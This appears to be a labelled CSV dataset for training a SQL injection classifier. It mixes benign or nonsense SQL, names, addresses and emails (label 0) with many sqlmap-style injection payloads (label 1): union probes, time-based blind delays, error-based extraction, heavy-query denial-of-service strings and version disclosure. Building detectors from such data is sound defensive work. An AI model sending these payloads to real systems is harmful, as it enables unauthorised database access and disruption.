Query,Label
"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",1
SELECT * FROM torn WHERE addition LIKE '%hide%',0
SELECT * FROM pay WHERE attention = 'sheep',0
SELECT TOP 3 * FROM ought WHERE attached = 'season',0
42210,0
if  (  8812  =  7896  )   select 8812 else drop function xltk--,1
"1%""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""%""  =  """,1
"select sleep  (  5  )   and   (  ""tlbj"" like ""tlbj",1
"c/ poetisa juana luna 135, 5-g",0
"-2333' union all select 9714,9714,9714--",1
cadaqus,0
corera,0
"c/ barriada nueva andalucia, 79, 5?f",0
SELECT blood ( s )  FROM ate UNION ALL,0
"-9135""   )    )    or 6872  =  6872 and    (    (   ""fllx""  =  ""fllx",1
spinnell@cpanelweb.com.ao,0
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  # ewsz,1
SELECT DISTINCT energy FROM smooth,0
SELECT * FROM lower WHERE social = 'probably',0
SELECT * FROM birth WHERE organization = 'consonant',0
"1""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""twpn"" like ""twpn",1
SELECT former ( s FROM heavy RIGHT JOIN,0
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1
45810,0
caballol menocal,0
"   SELECT COUNT ( fish ) , death FROM natural BY grown",0
47400,0
"plaa doctor robert, 127",0
SELECT sea ( s ) FROM while INNER JOIN,0
1'+  (  select iowv where 6105  =  6105 and sleep  (  5  )  #,1
"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'lwir' like 'lwir",1
"INSERT INTO individual  ( triangle, yourself, officer )  VALUES  ( 'mighty', 'curve', 'excited' )  ",0
"-5587%'  )   or elt  (  1032  =  1032,3623  )   and   (  '%'  =  '",1
"  SELECT shotID AS ID, same AS fuel FROM finger",0
"-2365   )    )    union all select 8190,8190#",1
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1
 (  select chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7812  =  7812  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )   from dual  ) ,1
"1%'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   '%'  =  '",1
SELECT * FROM local ORDER BY pet,0
" SELECT column_name ( s )  FROM so,giant",0
DELETE FROM colony,0
1  )   where 8232  =  8232 and   (  3020  =  3020  )  *6703--,1
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1
SELECT AVG ( Price ) FROM settlers,0
SELECT * FROM poet 3 SELECT * FROM yourself,0
SELECT * FROM rhyme WHERE slipped = 'lucky' FETCH FIRST 3 ROWS ONLY,0
"-9577'||  (  select 'vloa' from dual where 7184  =  7184 union all select 7184,7184#",1
"oso, el",0
raphael,0
"1   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   1402  =  1402",1
SELECT human FROM heading,0
SELECT * FROM stream,0
SELECT globe ( s )  FROM shirt UNION ALL,0
"1%'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  '%'  =  '",1
"1%"" union all select null,null,null,null--",1
SELECT knowledge FROM fog UNION ALL SELECT column FROM bowl ORDER BY wing,0
"1' union all select null,null,null,null,null#",1
SELECT * FROM Orders WHERE OrderDate BETWEEN '1996-07-01' AND '1996-07-31';,0
"1,  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  9841  =  9841",1
"1'+  (  select 'ewlk' where 1078  =  1078 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT MIN ( stiff )  AS salt FROM plane,0
"INSERT INTO come  ( rabbit, separate, full )  VALUES  ( 'government', 'using', 'hard' )  ",0
"1"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
SELECT * FROM call,0
"1   )    )    as fynx where 9636  =  9636 union all select null,null,null,null,null--",1
"-8124  )   union all select 7251,7251,7251#",1
"1 where 4477  =  4477 union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT MIN ( might )  AS famous FROM soap,0
select   (  case when   (  5768  =  9169  )   then 5768 else 1/  (  select 0  )   end  )  --,1
SELECT enemy ( s )  FROM five SELECT wrong FROM wind,0
"1   )    )    as henn where 9980  =  9980 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
49130,0
SELECT * FROM what WHERE by = 'quarter',0
SELECT MIN ( handsome )  AS lay FROM mad,0
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1
vallado oliveras,0
"   SELECT broad, blank+ ', ' + alike+ ' ' + managed+ ', ' + smallest AS dangerous  FROM meet",0
SELECT * FROM press WHERE heat BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT DEGREES ( 1.5 ) ;,0
select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,1
 UPDATE rhythm SET moment = 'purpose'WHERE mice = 'torn',0
exceptacin,0
"  SELECT * FROM bite WHERE explanation NOT IN  ( 'pig', 'station', 'western' )  ",0
limburg@estoespresto.cd,0
"1' where 4860  =  4860 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
randera,0
"-3505""  )   where 2340  =  2340 or 9323  =  9323#",1
"  SELECT protectionID AS ID, conversation AS plural FROM imagine",0
-8341 or 8571  =  8571--,1
SELECT * FROM modern 3,0
kiyohara,0
"1""  )   union all select null,null,null,null,null,null,null,null,null#",1
SELECT * FROM plane,0
33529,0
"1' where 1272  =  1272 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
handy.leleu@chevrolet-volt.gob,0
"1""  )   as kndn where 9314  =  9314",1
select sleep  (  5  )  -- waln,1
lauriaul,0
SELECT column_name ( s )   FROM table_name,0
43736952z,0
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1
"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ikaf"" like ""ikaf",1
SELECT TOP 3 * FROM its WHERE circus = 'pack',0
SELECT * FROM nation FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM basket,0
"1""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""umne"" like ""umne",1
kaufherr.gargoet@santacruzdelvoto.sh,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'qpdu'  =  'qpdu",1
SELECT castle,0
SELECT TOP 3 * FROM forty SELECT * FROM movie 3SELECT * FROM like,0
"1%""   )    )    union all select null,null,null,null,null,null,null,null--",1
datario,0
"1  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1""  )   union all select null,null,null#",1
"1  )   where 7775  =  7775 union all select null,null,null,null--",1
SELECT TOP 3 * FROM daily WHERE wood = 'appropriate' SELECT * FROM income,0
SELECT DISTINCT recent FROM mysterious,0
"1,  (  select * from generate_series  (  9108,9108,case when   (  9108  =  2900  )   then 1 else 0 end  )   limit 1  )  ",1
"-9557  )   where 2891  =  2891 union all select 2891,2891,2891,2891,2891,2891,2891,2891,2891--",1
"1""  )   where 7588  =  7588 waitfor delay '0:0:5'--",1
53238791r,0
22532,0
halford,0
SELECT fox FROM first UNION SELECT breakfast FROM mouse ORDER BY silk,0
"c/ pontevedra 25, 6a",0
"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",1
SELECT * FROM CustomersLIMIT 3;,0
"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 7074 )  ORDER BY meta_id ASC",0
pascual,0
1'||  (  select 'xmoq' from dual where 8047  =  8047 and 7533  =  7533  )  ||',1
52310665v,0
SELECT * FROM entire FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM finish,0
"1%"" and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
.lapidosa,0
if  (  2823  =  3532  )   select 2823 else drop function kmqw--,1
"   SELECT Employees.prize, COUNT ( Orders.tightID )  AS refusedFROM    ( OrdersINNER JOIN young ON Orders.wrappedID  =  Employees.recentlyID ) ",0
"  SELECT wide,step,adjective FROM proud LEFT JOIN Orders ON maybe.kitchenID =  belt.customs ORDER BY vertical.snake",0
"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  5099  =  5099",1
SELECT * FROM wp_users WHERE ID  =  '1' LIMIT 1,0
1%'  )   and   (  7704  =  3494  )  *3494 and   (  '%'  =  ',1
"-2840'   )    )     )   union all select 3025,3025,3025,3025--",1
SELECT * FROM butter WHERE complete = 'produce' LIMIT 3,0
1'||  (  select 'feki' where 4082  =  4082 and   (  3587  =  4207  )  *4207  )  ||',1
60928646j,0
"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  6690  =  6690",1
"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",1
raimulfo,0
SELECT church FROM field UNION ALL SELECT model FROM watch ORDER BY joy,0
"INSERT INTO bee  ( related, return, either )  VALUES  ( 'wear', 'matter', 'blue' )  ",0
tinajas,0
c/ comercio 51,0
guindo vive,0
"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""nzgn""  =  ""nzgn",1
"1 where 3478  =  3478   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
"-8612'  )   as toeu where 6357  =  6357 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
FROM  ( SELECT DISTINCT low FROM wish ) ,0
"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",1
8.51E+15,0
SELECT * FROM vertical FETCH FIRST 50 PERCENT ROWS ONLY,0
30666350j,0
"-5661'   )    )    union all select 3011,3011#",1
1%' and 2006  =  2006,1
"-7676""   )    )    as flov where 7967  =  7967 union all select 7967--",1
"1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'esma' like 'esma",1
"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv",1
"calle olivos de pea nevada, 124,",0
"INSERT INTO stay  ( pond, desk, addition )  VALUES  ( 'lunch', 'completely', 'active' )  ",0
SELECT TOP 3 * FROM only SELECT * FROM breathe 3SELECT * FROM wide,0
calvin@espaciodelpintor.by,0
SELECT eleven ( s FROM nothing RIGHT JOIN,0
"  UPDATE would SET zoo =  'family', City =  'death' WHERE magnet =  throat",0
SELECT draw FROM action UNION SELECT detail FROM printed ORDER BY popular,0
a8ique0r4r,0
1'||  (  select 'avxz' from dual where 7815  =  7815,1
capers@innovaris.fr,0
SELECT * FROM design FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM zipper,0
SELECT * FROM product  WHERE orange = sudden,0
SELECT * FROM copy  WHERE year NOT LIKE '[forget]%',0
"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,1
volkmann_parfrey1@sigloventidos.be,0
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1
butts@maxtienda.na,0
"-4100'   )    )    union all select 1163,1163,1163--",1
"1""  )   order by 1--",1
SELECT AVG ( sand ) FROM to SELECT SUM ( direction ) ,0
6015,0
SELECT factor ( s )  FROM ate UNION ALL,0
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo,1
4.97885E+15,0
orcoyen leal,0
25938703q,0
1' and   (  3020  =  3020  )  *6703 and 'hnvf'  =  'hnvf,1
"1'+  (  select 'qaar' where 7841  =  7841 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1
SELECT * FROM give  WHERE leader NOT LIKE '[ever]%',0
SELECT take ( s )  FROM helpful SELECT airplane FROM nest,0
SELECT COUNT ( wise ) FROM draw,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",1
" select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1
SELECT * FROM quick WHERE essential = 'grabbed' LIMIT 3,0
condemios de arriba,0
" SELECT * FROM heart ORDER BY lucky ASC, comfortable DESC",0
"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#",1
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'ylit' like 'ylit",1
12064316b,0
SELECT DISTINCT meet FROM got,0
SELECT cat ( s ) FROM sudden INNER JOIN,0
SELECT * FROM force,0
uhlhorn,0
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'gegg'  =  'gegg,1
SELECT AVG ( perfectly ) FROM band,0
" SELECT * FROM quietly ORDER BY myself ASC, beneath DESC",0
"1' in boolean mode  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  #",1
gherardo,0
-2022   )    )     )   or 6812  =  3516 and    (    (     (  3896  =  3896,1
"1'  )   where 3450  =  3450 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
n2ga1,0
-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
isidro,0
mcgovern-boxter@buscadordevideos.ag,0
"1""  )   where 1300  =  1300 order by 1#",1
1' where 9381  =  9381,1
"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
1'||  (  select 'mlwj' from dual where 4247  =  4247 and 1702  =  8469  )  ||',1
SELECT satisfied ( s )  FROM library SELECT get FROM fence,0
SELECT AVG ( provide ) FROM opposite,0
1'+  (  select 'ncny' where 5634  =  5634,1
SELECT * FROM repeat WHERE game = 'field' LIMIT 3,0
8855,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%""  =  """,1
"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",1
"   SELECT pick, thumb, vessels FROM horn WHERE wooden  IS NULL",0
"  SELECT * FROM quick WHERE dry NOT IN  ( 'ill', 'canal', 'research' )  ",0
"   SELECT fur, electric, person FROM felt WHERE president  IS NULL",0
"-4085'+  (  select aipn where 5493  =  5493 union all select 5493,5493,5493,5493,5493,5493,5493#",1
"  SELECT higherID AS ID, wagon AS tree FROM seven",0
SELECT * FROM hit WHERE company  BETWEEN 10 AND 20,0
39100,0
guinea hinojar,0
garmasin,0
c/ hermanos pinzon 178,0
46177,0
SELECT * FROM straw FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM behind,0
"1"" where 8241  =  8241 union all select null,null,null#",1
"1  )   where 3076  =  3076 union all select null,null,null,null,null--",1
"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
pitcavag,0
SELECT answer ( s )  FROM primitive UNION,0
"c/ gerardo de alvear, 119 10f",0
DELETE FROM funny WHERE brave = 'card',0
"1   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
arrafiz,0
ciadoncha,0
"calle isis, 180",0
SELECT cost ( s )  FROM hurt LEFT JOIN,0
"  SELECT Orders.smallrID, Employees.native, Employees.yourself FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.butID ORDER BY Orders.burstID",0
1'  )   union all select null#,1
kwok,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ||'",1
epps6,0
"  SELECT windowID AS ID, plus AS passage FROM frozen",0
"1""   )    )     )   union all select null--",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd",1
8888,0
1'||  (  select 'miew' where 8360  =  8360 waitfor delay '0:0:5'  )  ||',1
-4032'  )   where 5157  =  5157 or 1809  =  2810#,1
"  UPDATE kitchen SET wrote =  'ants', City =  'satellites' WHERE we =  range",0
"1' union all select null,null,null,null--",1
SELECT * FROM guard WHERE children NOT LIKE '[seldom]%',0
-7103   )    )    or 4610  =  1871 and    (    (   1249  =  1249,1
"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'vvkl'  =  'vvkl",1
"-9845""  )   as xpis where 1936  =  1936 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"   SELECT speech, somewhere, forget FROM putting WHERE on  IS NULL",0
"SELECT * FROM tired WHERE strong BETWEEN ""keep"" AND    ""difficult""",0
1 and 5934  =  7745,1
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1
waitfor delay '0:0:5' and    (    (     (  'ywnm'  =  'ywnm,1
bisad,0
"-8754""   )    )     )   union all select 7391,7391,7391,7391,7391,7391,7391--",1
2.79635E+15,0
ntpadmin,0
%2A%28%7C%28mail%3D%2A%29%29,1
1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,1
"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'peyy'  =  'peyy",1
-7663'   )    )    or 1558  =  1104 and    (    (   'wsrq'  =  'wsrq,1
"-6492'  )   union all select 7204,7204--",1
bjorn,0
julieta,0
SELECT AVG ( cotton ) FROM mother,0
laruffa,0
c/ san antonio 65 12?a,0
SELECT COUNT ( DISTINCT community )  FROM highway,0
SELECT * FROM using WHERE corner BETWEEN 'bill' AND 'off',0
casarabonela,0
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
SELECT * FROM nothing WHERE social = 'simply' LIMIT 3,0
"1%' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",1
SELECT * FROM vessels WHERE phrase BETWEEN oxygen09/01/1996mice AND thou15/31/1996airplane,0
FROM  ( SELECT DISTINCT mysterious FROM rod ) ,0
SELECT * FROM key WHERE suit = 'teach' LIMIT 3,0
jung5,0
SELECT MIN ( piano )  AS across FROM copper,0
"1%""   )    )     )   and make_set  (  8191  =  7813,7813  )   and    (    (     (  ""%""  =  """,1
3.60204E+15,0
SELECT * INTO newtable [IN externaldb ] FROM oldtable WHERE condition ;,0
SELECT AVG ( for ) FROM ordinary,0
3615,0
"-1844'  )   union all select 9572,9572,9572,9572#",1
"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
delvalle llers,0
40146763x,0
SELECT AVG ( layers ) FROM lady SELECT SUM ( writing ) ,0
"1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1
-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',1
SELECT dangerous,0
almcita,0
 UPDATE lift SET try = 'thin'WHERE occur = 'season',0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'cwuy'  =  'cwuy",1
SELECT AVG ( fresh ) FROM milk SELECT SUM ( voice ) ,0
45643261z,0
SELECT AVG ( pen ) FROM sand SELECT SUM ( maybe ) ,0
"1'   )    )    as wkys where 2478  =  2478 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'dsok'  =  'dsok",1
porteril,0
SELECT TOP 3 * FROM principal WHERE although = 'freedom',0
"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'ankn'  =  'ankn",1
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'tmwy'  =  'tmwy",1
"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""zxks""  =  ""zxks",1
"1%""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,1
SELECT * FROM society WHERE train  BETWEEN 10 AND 20,0
SELECT compare FROM sitting UNION ALL SELECT born FROM combination ORDER BY hurt,0
SELECT * FROM race WHERE opportunity LIKE '%front%',0
3.21396E+15,0
SELECT * FROM policeman FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM half,0
